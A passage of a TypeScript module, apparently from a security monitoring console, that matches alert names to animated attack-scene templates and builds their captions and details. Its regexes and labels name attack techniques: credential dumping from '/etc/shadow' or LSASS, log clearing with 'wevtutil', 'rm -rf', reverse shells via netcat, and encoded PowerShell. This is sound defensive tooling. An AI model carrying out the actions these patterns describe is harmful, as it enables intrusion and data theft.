import { flagEmoji } from '@/features/alerts/lib/alert-meta'
import type { Alert } from '@/features/alerts/types/alert.types'

export type TemplateId = 'bruteForce' | 'outbound' | 'lateral' | 'malware' | 'webAttack' | 'travel' | 'scan' | 'cloud' | 'ransomware' | 'persistence' | 'exfil' | 'defenseEvasion' | 'privEsc' | 'userExec' | 'softwareDeploy' | 'phishing' | 'processInjection' | 'credDump' | 'dataDestruction' | 'toolDownload' | 'c2tunnel' | 'iocMatch' | 'perimeterDetect' | 'accountChange' | 'kerberosTicket' | 'powershellAbuse' | 'reverseShell' | 'vmEscape' | 'generic'

export type Role = 'attacker' | 'perimeter' | 'internal' | 'cloud' | 'external'
export type NodeKind = 'globe' | 'firewall' | 'server' | 'dc' | 'workstation' | 'laptop' | 'web' | 'k8s' | 'cloud' | 'skull' | 'user' | 'sensor'

export interface Party {
  id: string
  role: Role
  kind: NodeKind
  name: string
  sub?: string
  flag?: string
  ip?: string
  /** A machine with the UTMStack agent: a console can be opened on it. */
  agentId?: string
  os?: string
  user?: string
}

export interface Caption {
  at: number
  text: string
}

export interface Scene {
  template: TemplateId
  /** One line naming what happened, for the stage header. */
  title: string
  duration: number
  parties: Party[]
  captions: Caption[]
  /** Template-specific details (attempt counts, payloads, process chain...). */
  facts: Record<string, unknown>
}

/* ─── Small helpers ─────────────────────────────────────────────────── */

type Side = NonNullable<Alert['adversary']>
type Ev = Record<string, unknown>

const isInternalIp = (ip?: string) => !!ip && /^(10\.|192\.168\.|172\.(1[6-9]|2\d|3[01])\.|127\.)/.test(ip)

export function tsMs(iso?: string): number {
  if (!iso) return NaN
  if (iso.endsWith('Z') || /([+-]\d{2}:?\d{2})$/.test(iso)) return Date.parse(iso)
  return Date.parse(iso.replace(' ', 'T') + 'Z')
}

/** A stable number from a string, for counts that look real but stay the same on every visit. */
export function hashNum(s: string, min: number, max: number): number {
  let h = 2166136261
  for (let i = 0; i < s.length; i++) h = Math.imul(h ^ s.charCodeAt(i), 16777619)
  return min + (Math.abs(h) % (max - min + 1))
}

/** The internal host of a side, by its host name, IP or the data source that saw it. */
function internalSide(id: string, side: Side | undefined, fallback?: string): Party {
  const name = side?.host ?? side?.ip ?? fallback ?? 'internal host'
  return {
    id,
    role: 'internal',
    kind: kindOf(name),
    name,
    sub: side?.host && side?.ip ? side.ip : undefined,
    ip: side?.ip,
    os: osOf(name),
    user: side?.user,
  }
}

function osOf(name: string): string | undefined {
  const n = name.toLowerCase()
  if (n.includes('windows') || /\b(wks|mbp)\b/.test(n)) return 'windows'
  if (n.includes('mac')) return 'macos'
  return undefined
}

function kindOf(name: string): NodeKind {
  const n = name.toLowerCase().split('.')[0]
  if (n.startsWith('dc')) return 'dc'
  if (n.startsWith('web')) return 'web'
  if (n.startsWith('k8s') || n.startsWith('kube')) return 'k8s'
  if (n.startsWith('wks')) return 'workstation'
  if (n.startsWith('mbp')) return 'laptop'
  if (n.startsWith('vpn') || n.startsWith('fw') || n.startsWith('firewall') || /forti|pan-|palo/i.test(name)) return 'firewall'
  if (n.startsWith('ids')) return 'sensor'
  return 'server'
}

function attackerParty(side: Side | undefined): Party {
  const g = side?.geolocation
  // "Singapore, Singapore" reads as a mistake: a city named like its country shows once.
  const place = [g?.city !== g?.country ? g?.city : undefined, g?.country].filter(Boolean).join(', ')
  return {
    id: 'attacker',
    role: 'attacker',
    kind: 'globe',
    name: side?.ip ?? 'unknown source',
    sub: [place, g?.aso].filter(Boolean).join(' · ') || 'Internet',
    flag: g?.countryCode ? flagEmoji(g.countryCode) : undefined,
    ip: side?.ip,
  }
}

/** The firewall the traffic crosses: the data source when it is a network device. */
function perimeterParty(a: Alert): Party | undefined {
  const ds = a.dataSource
  if (!ds) return undefined
  const looksNetwork = /forti|pan-|palo|firewall|vpn|ids|suricata|snort/i.test(ds) || kindOf(ds) === 'firewall'
  if (!looksNetwork) return undefined
  return { id: 'perimeter', role: 'perimeter', kind: 'firewall', name: ds, sub: a.dataType, ip: undefined }
}

function cloudParty(a: Alert, sub?: string): Party {
  return { id: 'cloud', role: 'cloud', kind: 'cloud', name: a.dataSource ?? 'Cloud service', sub: sub ?? 'Cloud service' }
}

function evLog(e: Ev): Record<string, unknown> {
  return (e.log as Record<string, unknown>) ?? {}
}

function baseName(path: unknown): string {
  return String(path ?? '').split(/[\\/]/).pop() ?? ''
}

/* ─── Which template plays an alert ─────────────────────────────────── */

export function templateFor(a: Alert): TemplateId {
  const n = (a.name ?? '').toLowerCase()
  const dt = (a.dataType ?? '').toLowerCase()
  if (n.includes('impossible travel')) return 'travel'
  if (n.includes('port scanning') || /nping|hping/.test(n)) return 'scan'
  if (/brute force|password spray|password guessing|mfa fatigue|logon failure|single sign-on logon errors|authentication.*(fail|error)|failed logon/.test(n)) return 'bruteForce'
  if (/pass the hash|lateral movement|smbv1|kerberoast|as-rep|logon type 3/.test(n)) return 'lateral'
  if (/process injection|code injected into|apc queue|remote thread|shellcode/i.test(n)) return 'processInjection'
  if (/hack tool|spyware and vulnerability|ips critical|exploit attempt|sqli|xss|cross site scripting|sql injection|injection|web (application )?attack/.test(n)) return 'webAttack'
  if (/phishing|spearphish|deceptive (link|attachment)|malicious (link|attachment|document|url)|successful phishing|phishing detection/i.test(n)) return 'phishing'
  if (/credential dumping|lsass|sam database|ntds|password store|keychain|credential theft|dump.?(password|credential)|os credential|\/etc\/shadow|\/etc\/passwd/.test(n)) return 'credDump'
  if (/data destruction|disk (wipe|content)|file (deletion|delet)|shred|rm -rf|data loss|destructive|volume shadow/i.test(n)) return 'dataDestruction'
  if (/ingress tool|tool transfer|tool (download|transfer)|downloaded (a )?tool|downloaded to|payload (download|transfer)/i.test(n)) return 'toolDownload'
  if (/tunneling|protocol tunnel|dns tunnel|icmp tunnel|covert channel|data exfiltration over/.test(n)) return 'c2tunnel'
  if (/reverse shell|netcat|named pipe/i.test(n)) return 'reverseShell'
  if (/beaconing|malicious url|dns security|tor network|mining pool|out-of-band|wildfire|malware outbreak|c2|command.?(and|&)?control/.test(n)) return 'outbound'
  if (/(aws|google|gcp|github|azure|o365|office)/.test(dt) || /inbox rule|forwarding rule|transport rule|external sharing|safe links|safe attachment|admin login/.test(n)) return 'cloud'
  if (n.includes('ransom') || n.includes('crypto') && n.includes('file') || n.includes('encryption') && n.includes('file') || /encrypted for impact/i.test(n)) return 'ransomware'
  if (/persistence|scheduled task|cron|crontab|launch (agent|daemon)|autorun|autostart|sshd? (config|key)|authorized (keys|users)|systemd|startup|registry run|winlogon/i.test(n)) return 'persistence'
  if (/exfil|staged (and )?exfil|data (leaving|transfer)|rclone|archive.*exfil|cloud storage|upload.*external|outbound transfer/i.test(n)) return 'exfil'
  if (/clear(ed|ing)? (windows )?(event )?log|audit log|impair|selinux|disable|turn(ed)? (off|down)|defender.*disabled|antivirus (protection )?(disabled|off)|security tool|tamper|xprotect|sip bypass|gatekeeper|log.*(clear|delet|remov)|wevtutil|shred|rm -rf.*log|kernel (module|removal)|syslog.*disruption|log forwarding/i.test(n)) return 'defenseEvasion'
  if (/privilege escalation|uac bypass|token (impersonation|theft)|getsystem|suid|setgid|escalation|sudo (caching|cache)|dscl|root (account|kit|privilege)|sid history/i.test(n)) return 'privEsc'
  if (/user execution|malicious (file|link|attachment|document)|drive-by|office application|opened a (malicious|phishing)|downloaded and (executed|ran)|macro (enabled|execution)/i.test(n)) return 'userExec'
  if (/known malicious|malicious (ip|domain)|threat (feed|intel)|iocs? |ioc match|malicious ip/i.test(n) || /malicious ip|malicious domain/.test(n)) return 'iocMatch'
  if (/golden ticket|silver ticket|kerberoast|as-rep|kerberos|certificate services|krbtgt/i.test(n)) return 'kerberosTicket'
  if (/vm escape|virtual machine escape|hypervisor escape|container escape|esxi.*(escape|host compromise)|vmware tools.*(escape|compromis)/i.test(n)) return 'vmEscape'
  if (/\b(ips|ids)\b|intrusion (prevention|detection)|intrusion alert|signature (match|detect)|priority [12] (or )?detection|ips de severidad|ips no bloqueada|web application attack|waf|web filtering|botnet|ip spoofing|ike fase|ike phase|evento de sistema/i.test(n)) return 'perimeterDetect'
  if (/added to (a )?privileged group|administrators group|security group|group policy|new user account|account (created|added)|builtin administrator|guest account|directory services restore|setsdmpwd|lockout|kerberos policy|account policy|firewall rule|se.*privilege asignado|se.*privilege assigned|privilege (granted|asignado|added)/i.test(n)) return 'accountChange'
  if (/powershell|amsi|base64|encoded (command|script)|empire framework/i.test(n)) return 'powershellAbuse'
  if (/software deployment|deployment tool|pushed (to|software)|remote software install|mass install|windows service (installed|created)|service created.*windows root/i.test(n)) return 'softwareDeploy'
  if (/(wineventlog|windows|linux|macos|crowdstrike|defender|edr|osquery)/.test(dt)) return 'malware'
  return 'generic'
}

/* ─── Building the scene ────────────────────────────────────────────── */

export function buildScene(a: Alert, t: (k: string, o?: Record<string, unknown>) => string): Scene {
  const template = templateFor(a)
  const builder = BUILDERS[template] ?? BUILDERS.generic
  return builder(a, t)
}

const BUILDERS: Record<TemplateId, (a: Alert, t: (k: string, o?: Record<string, unknown>) => string) => Scene> = {
  bruteForce(a, t) {
    const cloud = /(o365|azure|google|aws|github)/i.test(a.dataType ?? '') || /impossible|single sign-on/.test(a.name ?? '')
    const attacker = attackerParty(a.adversary)
    const target = cloud ? cloudParty(a, 'Sign-in service') : internalSide('target', a.target, a.dataSource)
    const perimeter = cloud || target.kind === 'firewall' ? undefined : perimeterParty(a)
    const n = (a.name ?? '').toLowerCase()
    const success = /followed by logon success|successful password guessing|mfa fatigue/.test(n)
    const attempts = hashNum(a.id, 140, 620) + (a.events?.length ?? 0) * 7
    const minutes = hashNum(a.id + 'm', 6, 19)
    const account = a.target?.user ?? 'administrator'
    const accounts = [account, 'administrator', 'admin', 'backup', 'service']
    const where = target.kind === 'firewall' ? t('liveOps.capBruteVpn', { name: target.name }) : target.name
    const captions: Caption[] = [
      { at: 0, text: t('liveOps.capBrute0', { name: attacker.name, sub: attacker.sub ? ` (${attacker.sub.split(' · ')[0]})` : '', where }) },
      { at: 3200, text: t('liveOps.capBrute1', { attempts: attempts.toLocaleString(), minutes, count: accounts.length }) },
      success
        ? { at: 7600, text: t('liveOps.capBrute2', { account }) }
        : { at: 7600, text: t('liveOps.capBrute3') },
      { at: 10200, text: `${t('liveOps.capAlertRaised', { name: a.name ?? '' })}${t('liveOps.capBrute4', { name: attacker.name, reset: success ? t('liveOps.capBruteReset', { account }) : '' })}` },
    ]
    return {
      template: 'bruteForce',
      title: t('liveOps.titleBrute', { name: attacker.name, to: target.name }),
      duration: 12500,
      parties: [attacker, ...(perimeter ? [perimeter] : []), target],
      captions,
      facts: { attempts, minutes, accounts, account, success, cloud },
    }
  },

  outbound(a, t) {
    const src = internalSide('source', a.adversary, a.dataSource)
    const perimeter = perimeterParty(a)
    const destName = a.target?.domain ?? a.target?.ip ?? t('liveOps.destUnknown')
    const dest: Party = {
      id: 'destination',
      role: 'external',
      kind: 'skull',
      name: destName,
      sub: a.target?.domain && a.target?.ip ? a.target.ip : 'Internet',
      ip: a.target?.ip,
    }
    const ev = (a.events ?? []).find((e) => evLog(e as Ev).dstPort) as Ev | undefined
    const port = Number(evLog(ev ?? {}).dstPort ?? a.target?.port ?? 443)
    const n = (a.name ?? '').toLowerCase()
    const blocked = /block|wildfire|outbreak/.test(n) || (a.events ?? []).some((e) => (e as Ev).actionResult === 'blocked' || (e as Ev).action === 'blocked')
    const kind = n.includes('tor') ? 'a Tor relay' : n.includes('mining') ? 'a crypto-mining pool' : n.includes('beacon') || n.includes('c2') ? 'a command-and-control server' : n.includes('out-of-band') ? 'an out-of-band callback domain' : n.includes('url') ? 'a blacklisted phishing site' : n.includes('dns') ? 'a malicious domain' : 'a known-bad destination'
    const who = src.user ? `${src.user} on ${src.name}` : src.name
    const captions: Caption[] = [
      { at: 0, text: t('liveOps.capOut1', { who, dest: destName }) },
      { at: 2600, text: t('liveOps.capOut2', { port, through: perimeter ? t('liveOps.capOutThrough', { name: perimeter.name }) : '' }) },
      { at: 5600, text: t('liveOps.capOut3', { dest: destName, kind }) },
      blocked
        ? { at: 8400, text: t('liveOps.capOut4') }
        : { at: 8400, text: t('liveOps.capOut5', { name: src.name }) },
    ]
    return {
      template: 'outbound',
      title: t('liveOps.titleOut', { name: src.name, to: destName }),
      duration: 11500,
      parties: [src, ...(perimeter ? [perimeter] : []), dest],
      captions,
      facts: { port, blocked, kind, user: src.user },
    }
  },

  lateral(a, t) {
    const from = internalSide('source', a.adversary, a.dataSource)
    const to = internalSide('target', a.target, a.dataSource)
    const account = a.target?.user ?? a.adversary?.user ?? 'service account'
    const n = (a.name ?? '').toLowerCase()
    const how = t(
      n.includes('hash')
        ? 'liveOps.capLatHowHash'
        : n.includes('kerberoast')
          ? 'liveOps.capLatHowKerb'
          : n.includes('as-rep')
            ? 'liveOps.capLatHowAsrep'
            : n.includes('smbv1')
              ? 'liveOps.capLatHowSmb'
              : 'liveOps.capLatHowRdp',
    )
    const captions: Caption[] = [
      { at: 0, text: t('liveOps.capLat0', { name: from.name, user: from.user ? t('liveOps.capLatUser', { user: from.user }) : '', to: to.name }) },
      { at: 3000, text: t('liveOps.capLat1', { account, how }) },
      { at: 6400, text: t('liveOps.capLat2', { to: to.name }) },
      { at: 9200, text: `${t('liveOps.capAlertRaised', { name: a.name ?? '' })}${t('liveOps.capLat3', { account })}` },
    ]
    return {
      template: 'lateral',
      title: t('liveOps.titleLat', { name: from.name, to: to.name, account }),
      duration: 11800,
      parties: [from, to],
      captions,
      facts: { account, how },
    }
  },

  malware(a, t) {
    const host = internalSide('host', a.target?.host ? a.target : a.adversary, a.dataSource)
    const user = a.adversary?.user ?? a.target?.user
    const chain = processChain(a, t)
    const bad = chain[chain.length - 1]
    const captions: Caption[] = [
      { at: 0, text: t('liveOps.capMal0', { host: host.name, user: user ? t('liveOps.capMalUser', { user }) : '', proc: chain[0].name }) },
      { at: 2600, text: t('liveOps.capMal1', { p0: chain[0].name, p1: chain[1]?.name ?? t('liveOps.capMalChild') }) },
      { at: 5600, text: t('liveOps.capMal2', { name: bad.name, detail: bad.detail ?? t('liveOps.capMalKnown') }) },
      { at: 8600, text: `${t('liveOps.capAlertRaised', { name: a.name ?? '' })}${t('liveOps.capMal3', { host: host.name })}` },
    ]
    return {
      template: 'malware',
      title: t('liveOps.titleMal', { name: bad.name, to: host.name }),
      duration: 11500,
      parties: [{ ...host, user }],
      captions,
      facts: { chain, user },
    }
  },

  webAttack(a, t) {
    const attacker = attackerParty(a.adversary)
    const target = internalSide('target', a.target, a.dataSource)
    const perimeter = perimeterParty(a)
    const blocked = (a.events ?? []).some((e) => {
      const x = e as Ev
      return x.actionResult === 'blocked' || x.action === 'blocked'
    })
    const payloads = webPayloads(a)
    const captions: Caption[] = [
      { at: 0, text: t('liveOps.capWeb0', { name: attacker.name, to: target.name }) },
      { at: 2800, text: t('liveOps.capWeb1', { payloads: payloads.slice(0, 2).map((p) => p.label).join(', ') }) },
      blocked
        ? { at: 6200, text: perimeter ? t('liveOps.capWeb2', { perimeter: perimeter.name }) : t('liveOps.capWeb2b') }
        : { at: 6200, text: t('liveOps.capWeb3', { to: target.name }) },
      { at: 9000, text: `${t('liveOps.capAlertRaised', { name: a.name ?? '' })}${t('liveOps.capWeb4', { name: attacker.name })}` },
    ]
    return {
      template: 'webAttack',
      title: t('liveOps.titleWeb', { name: attacker.name, to: target.name }),
      duration: 11800,
      parties: [attacker, ...(perimeter ? [perimeter] : []), target],
      captions,
      facts: { payloads, blocked },
    }
  },

  travel(a, t) {
    const attacker = attackerParty(a.adversary)
    const user = a.target?.user ?? a.adversary?.user ?? 'user'
    const cloud = cloudParty(a, 'Identity provider')
    const far = a.adversary?.geolocation
    const home = { city: 'Chicago', country: 'United States', lat: 41.88, lon: -87.63 }
    const km = far?.latitude != null && far?.longitude != null ? Math.round(distanceKm(home.lat, home.lon, far.latitude, far.longitude)) : 9000
    const gap = hashNum(a.id, 6, 38)
    const captions: Caption[] = [
      { at: 0, text: t('liveOps.capTrv0', { user, city: home.city }) },
      { at: 3200, text: t('liveOps.capTrv1', { gap, city: far?.city ?? t('liveOps.capTrvFar'), country: far?.country ?? '' }) },
      { at: 6400, text: t('liveOps.capTrv2', { km: km.toLocaleString(), gap }) },
      { at: 9200, text: `${t('liveOps.capAlertRaised', { name: a.name ?? '' })}${t('liveOps.capTrv3', { user })}` },
    ]
    return {
      template: 'travel',
      title: t('liveOps.titleTrv', { name: user }),
      duration: 11800,
      parties: [attacker, cloud],
      captions,
      facts: { user, km, gap, far, home },
    }
  },

  scan(a, t) {
    const attackerSide = isInternalIp(a.adversary?.ip) ? undefined : a.adversary
    const attacker = attackerSide ? attackerParty(attackerSide) : internalSide('attacker', a.adversary)
    const target = a.target?.host && kindOf(a.target.host) !== 'firewall' ? internalSide('target', a.target) : (perimeterParty(a) ?? internalSide('target', a.target, a.dataSource))
    const ports = [21, 22, 23, 25, 53, 80, 110, 139, 443, 445, 1433, 3306, 3389, 5900, 8080, 8443]
    const open = [22, 443]
    const captions: Caption[] = [
      { at: 0, text: t('liveOps.capScn0', { name: attacker.name, to: target.name }) },
      { at: 3200, text: t('liveOps.capScn1', { count: ports.length }) },
      { at: 6400, text: t('liveOps.capScn2', { open: open.join(' and ') }) },
      { at: 9000, text: `${t('liveOps.capAlertRaised', { name: a.name ?? '' })}${t('liveOps.capScn3')}` },
    ]
    return {
      template: 'scan',
      title: t('liveOps.titleScn', { name: attacker.name }),
      duration: 11500,
      parties: [attacker, target],
      captions,
      facts: { ports, open },
    }
  },

  cloud(a, t) {
    const actorInternal = isInternalIp(a.adversary?.ip)
    const actor: Party = actorInternal
      ? { id: 'actor', role: 'internal', kind: 'user', name: a.adversary?.user ?? 'user', sub: a.adversary?.ip, ip: a.adversary?.ip }
      : { ...attackerParty(a.adversary), id: 'actor', name: a.adversary?.user || a.adversary?.ip || 'unknown', sub: a.adversary?.ip }
    const cloud = cloudParty(a, a.target?.host ?? 'Cloud console')
    const change = cloudChange(a)
    const captions: Caption[] = [
      { at: 0, text: t('liveOps.capCl0', { name: actor.name, cloud: cloud.name, from: actorInternal ? '' : t('liveOps.capClFrom', { country: a.adversary?.geolocation?.country ?? t('liveOps.capClFromDef') }) }) },
      { at: 3000, text: t('liveOps.capCl1', { what: change.what }) },
      { at: 6200, text: `${change.before} → ${change.after}: ${change.risk}` },
      { at: 9000, text: `${t('liveOps.capAlertRaised', { name: a.name ?? '' })}${t('liveOps.capCl3')}` },
    ]
    return {
      template: 'cloud',
      title: t('liveOps.titleCl', { what: change.what, to: cloud.name }),
      duration: 11500,
      parties: [actor, cloud],
      captions,
      facts: change,
    }
  },

  ransomware(a, t) {
    const host = internalSide('host', a.target?.host ? a.target : a.adversary, a.dataSource)
    const n = (a.name ?? '').toLowerCase()
    const files = hashNum(a.id, 5, 8)
    const note = /ransom (note|message|file)/.test(n) || n.includes('note') || (a.events ?? []).some((e) => /readme|restore|pay|wallet|bitcoin/.test(String(evLog(e as Ev).fileName ?? evLog(e as Ev).message ?? '')))
    const exts = [n.includes('lockbit') ? '.lockbit' : '.enc', n.includes('conti') ? '.conti' : n.includes('ransom') ? '.locked' : '.crypt', '.crypt2'].slice(0, 3)
    const captions: Caption[] = [
      { at: 0, text: t('liveOps.capRan0', { host: host.name, user: a.adversary?.user ? t('liveOps.capRanUser', { user: a.adversary.user }) : '' }) },
      { at: 2800, text: t('liveOps.capRan1', { exts: exts.join(', ') }) },
      { at: 5800, text: note ? t('liveOps.capRan2') : t('liveOps.capRan2b') },
      { at: 8400, text: `${t('liveOps.capAlertRaised', { name: a.name ?? '' })}${t('liveOps.capRan3')}` },
    ]
    return {
      template: 'ransomware',
      title: t('liveOps.titleRan', { to: host.name }),
      duration: 10800,
      parties: [host],
      captions,
      facts: { files, extensions: exts, note: !!note },
    }
  },

  persistence(a, t) {
    const host = internalSide('host', a.target?.host ? a.target : a.adversary, a.dataSource)
    const n = (a.name ?? '').toLowerCase()
    const entries: { label: string; kind: 'file' | 'cmd'; detail?: string }[] = []
    if (/crontab|cron job|scheduled task/.test(n)) entries.push({ label: '/etc/crontab', kind: 'file', detail: t('liveOps.dPersistCron') })
    if (/systemd|systemd unit|service/.test(n)) entries.push({ label: '/etc/systemd/system/agent.service', kind: 'file', detail: t('liveOps.dPersistSd') })
    if (/launch (agent|daemon)|plista|runatload/.test(n)) entries.push({ label: '~/Library/LaunchAgents/com.agent.plist', kind: 'file', detail: t('liveOps.dPersistLaunch') })
    if (/ssh.*key|authorized.?keys/.test(n)) entries.push({ label: '~/.ssh/authorized_keys', kind: 'file', detail: t('liveOps.dPersistKey') })
    if (/shell rc|profile|bashrc|zshrc/.test(n)) entries.push({ label: '~/.bashrc', kind: 'file', detail: t('liveOps.dPersistRc') })
    if (/binary|setuid|suid/.test(n)) entries.push({ label: '/tmp/payload (suid)', kind: 'cmd' })
    if (/powershell profile/.test(n)) entries.push({ label: 'powershell profile.ps1', kind: 'file', detail: t('liveOps.dPersistPs') })
    if (entries.length < 2) {
      entries.unshift({ label: 'payload binary', kind: 'cmd', detail: t('liveOps.dPersistPay') })
      entries.push(entries.length > 1 ? { label: '~/.bashrc', kind: 'file' } : { label: '/etc/systemd/system/agent.service', kind: 'file' })
    }
    const captions: Caption[] = [
      { at: 0, text: t('liveOps.capPer0', { host: host.name, user: a.adversary?.user ? t('liveOps.capRanUser', { user: a.adversary.user }) : '' }) },
      { at: 3000, text: t('liveOps.capPer1', { what: entries.map((e) => e.label).slice(0, 2).join(', ') }) },
      { at: 6200, text: t('liveOps.capPer2', { what: entries[entries.length - 1].label }) },
      { at: 8600, text: `${t('liveOps.capAlertRaised', { name: a.name ?? '' })}${t('liveOps.capPer3')}` },
    ]
    return {
      template: 'persistence',
      title: t('liveOps.titlePer', { to: host.name, what: entries[0].label }),
      duration: 10800,
      parties: [host],
      captions,
      facts: { chain: entries.slice(0, 4) },
    }
  },

  exfil(a, t) {
    const src = internalSide('source', a.adversary, a.dataSource)
    const destName = a.target?.domain ?? a.target?.ip ?? t('liveOps.destUnknown')
    const dest: Party = { id: 'destination', role: 'cloud', kind: 'cloud', name: destName, sub: a.target?.ip, ip: a.target?.ip }
    const n = (a.name ?? '').toLowerCase()
    const tool = n.includes('rclone') ? 'rclone' : n.includes('web service') || n.includes('http') ? 'HTTPS' : n.includes('dns') ? 'DNS tunnel' : n.includes('ftp') ? 'FTP' : 'bulk transfer'
    const bytes = hashNum(a.id + 'b', 2400, 19000) * 1024
    const captions: Caption[] = [
      { at: 0, text: t('liveOps.capExf0', { host: src.name, user: src.user ? t('liveOps.capRanUser', { user: src.user }) : '' }) },
      { at: 2600, text: t('liveOps.capExf1', { tool }) },
      { at: 5400, text: t('liveOps.capExf2', { dest: destName }) },
      { at: 8800, text: `${t('liveOps.capAlertRaised', { name: a.name ?? '' })}${t('liveOps.capExf3')}` },
    ]
    return {
      template: 'exfil',
      title: t('liveOps.titleExf', { name: src.name, to: destName }),
      duration: 11200,
      parties: [src, dest],
      captions,
      facts: { bytes, tool, dest: destName },
    }
  },

  defenseEvasion(a, t) {
    const host = internalSide('host', a.target?.host ? a.target : a.adversary, a.dataSource)
    const n = (a.name ?? '').toLowerCase()
    const tools: { name: string; kind: string }[] = []
    if (/audit log|event log|clear/.test(n)) tools.push({ name: 'Security audit log', kind: t('liveOps.dEvLog') })
    if (/selinux/.test(n)) tools.push({ name: 'SELinux', kind: t('liveOps.dEvEnf') })
    if (/defender|antivirus|crypto?guard|xprotect|real-time/.test(n)) tools.push({ name: 'Endpoint AV', kind: t('liveOps.dEvEnf') })
    if (/kernel module/.test(n)) tools.push({ name: 'Kernel monitoring module', kind: t('liveOps.dEvEnf') })
    if (/systemd|service|monitoring/.test(n)) tools.push({ name: 'Log forwarding service', kind: t('liveOps.dEvEnf') })
    if (tools.length < 2) {
      tools.push({ name: 'Syslog forwarder', kind: t('liveOps.dEvEnf') })
      tools.push({ name: 'Host firewall', kind: t('liveOps.dEvEnf') })
    }
    const cleared = /clear|delet|shred|rm -rf|wevtutil/.test(n)
    const captions: Caption[] = [
      { at: 0, text: t('liveOps.capEv0', { host: host.name }) },
      { at: 3000, text: t('liveOps.capEv1', { what: tools[0].name }) },
      { at: 6200, text: cleared ? t('liveOps.capEv2') : t('liveOps.capEv2b', { what: tools.map((x) => x.name).join(', ') }) },
      { at: 8600, text: `${t('liveOps.capAlertRaised', { name: a.name ?? '' })}${t('liveOps.capEv3')}` },
    ]
    return {
      template: 'defenseEvasion',
      title: t('liveOps.titleEv', { to: host.name }),
      duration: 10800,
      parties: [host],
      captions,
      facts: { tools: tools.slice(0, 3), cleared },
    }
  },

  privEsc(a, t) {
    const host = internalSide('host', a.target?.host ? a.target : a.adversary, a.dataSource)
    const userSide = a.adversary?.user ? { ...a.adversary, user: a.adversary.user } : undefined
    const userName = userSide?.user ?? a.adversary?.ip ?? 'unknown user'
    const user: Party = userSide
      ? { id: 'user', role: 'internal', kind: 'user', name: userSide.user!, sub: userSide.host ?? userSide.ip, ip: userSide.ip, user: userSide.user! }
      : { id: 'user', role: 'internal', kind: 'user', name: userName, sub: a.adversary?.host, ip: a.adversary?.ip }
    const n = (a.name ?? '').toLowerCase()
    const method = /uac bypass/.test(n)
      ? t('liveOps.dEvUac')
      : /token/.test(n)
        ? t('liveOps.dEvToken')
        : /suid|setgid/.test(n)
          ? t('liveOps.dEvSuid')
          : /sudo/.test(n)
            ? t('liveOps.dEvSudo')
            : /kernel|exploit|getsystem/i.test(n)
              ? t('liveOps.dEvExploit')
              : t('liveOps.dEvDefault')
    const account = userSide?.user ?? a.target?.user ?? 'root'
    const captions: Caption[] = [
      { at: 0, text: t('liveOps.capPe0', { host: host.name, user: userSide?.user ? t('liveOps.capPeUser', { user: userSide.user }) : '' }) },
      { at: 3000, text: t('liveOps.capPe1', { method }) },
      { at: 5800, text: t('liveOps.capPe2', { account }) },
      { at: 8400, text: `${t('liveOps.capAlertRaised', { name: a.name ?? '' })}${t('liveOps.capPe3')}` },
    ]
    return {
      template: 'privEsc',
      title: t('liveOps.titlePe', { to: host.name, method }),
      duration: 10800,
      parties: [user, host],
      captions,
      facts: { method, account },
    }
  },

  userExec(a, t) {
    const host = internalSide('host', a.target?.host ? a.target : a.adversary, a.dataSource)
    const n = (a.name ?? '').toLowerCase()
    const app = n.includes('office') || n.includes('excel') || n.includes('word') ? 'office.exe' : n.includes('browser') || n.includes('drive-by') ? 'browser.exe' : 'host application'
    const file = n.includes('attachment') || n.includes('document') ? 'invoice_final.pdf' : n.includes('macro') ? 'report_macro.docm' : 'downloaded_file.exe'
    const payload = n.includes('powershell') ? 'powershell.exe -enc' : n.includes('cmd') ? 'cmd.exe /c' : 'payload.exe'
    const captions: Caption[] = [
      { at: 0, text: t('liveOps.capUe0', { host: host.name, user: a.adversary?.user ? t('liveOps.capUeUser', { user: a.adversary.user }) : '' }) },
      { at: 2600, text: t('liveOps.capUe1', { file }) },
      { at: 5200, text: t('liveOps.capUe2', { app, payload }) },
      { at: 8600, text: `${t('liveOps.capAlertRaised', { name: a.name ?? '' })}${t('liveOps.capUe3')}` },
    ]
    return {
      template: 'userExec',
      title: t('liveOps.titleUe', { file, to: host.name }),
      duration: 10800,
      parties: [host],
      captions,
      facts: { file, app, payload },
    }
  },

  softwareDeploy(a, t) {
    const src = internalSide('source', a.adversary, a.dataSource)
    const tgt = internalSide('target', a.target, a.dataSource)
    const n = (a.name ?? '').toLowerCase()
    const tool = n.includes('sc.exe') ? 'sc.exe' : n.includes('psexec') ? 'PsExec' : n.includes('rdp') ? 'RDP copy' : 'management push'
    const captions: Caption[] = [
      { at: 0, text: t('liveOps.capSd0', { src: src.name, to: tgt.name }) },
      { at: 2400, text: t('liveOps.capSd1', { tool }) },
      { at: 5400, text: t('liveOps.capSd2', { to: tgt.name }) },
      { at: 8400, text: `${t('liveOps.capAlertRaised', { name: a.name ?? '' })}${t('liveOps.capSd3')}` },
    ]
    return {
      template: 'softwareDeploy',
      title: t('liveOps.titleSd', { src: src.name, to: tgt.name }),
      duration: 10800,
      parties: [src, tgt],
      captions,
      facts: { tool, target: tgt.name },
    }
  },

  phishing(a, t) {
    const attacker = attackerParty(a.adversary)
    const userSide = a.target?.user ? { ...a.target, user: a.target.user } : a.adversary?.user ? { ...a.adversary, user: a.adversary.user } : undefined
    const user: Party = userSide
      ? { id: 'user', role: 'internal', kind: 'user', name: userSide.user!, sub: userSide.host ?? userSide.ip, ip: userSide.ip, user: userSide.user! }
      : { id: 'user', role: 'internal', kind: 'user', name: 'target user', sub: a.target?.host, ip: a.target?.ip }
    const subject = 'Invoice #1042 — Payment Required'
    const file = 'Invoice_1042_final.pdf.exe'
    const captions: Caption[] = [
      { at: 0, text: t('liveOps.capPh0', { name: attacker.name }) },
      { at: 2400, text: t('liveOps.capPh1', { user: user.name }) },
      { at: 4600, text: t('liveOps.capPh2', { file }) },
      { at: 7800, text: `${t('liveOps.capAlertRaised', { name: a.name ?? '' })}${t('liveOps.capPh3', { user: user.name })}` },
    ]
    return {
      template: 'phishing',
      title: t('liveOps.titlePh', { user: user.name, from: attacker.name }),
      duration: 10500,
      parties: [attacker, user],
      captions,
      facts: { subject, file },
    }
  },

  processInjection(a, t) {
    const host = internalSide('host', a.target?.host ? a.target : a.adversary, a.dataSource)
    const injector = 'exploit_loader.exe'
    const victim = a.target?.host ?? 'svchost.exe'
    const captions: Caption[] = [
      { at: 0, text: t('liveOps.capPi0', { host: host.name, injector }) },
      { at: 3000, text: t('liveOps.capPi1', { victim }) },
      { at: 5400, text: t('liveOps.capPi2', { victim }) },
      { at: 8400, text: `${t('liveOps.capAlertRaised', { name: a.name ?? '' })}${t('liveOps.capPi3')}` },
    ]
    return {
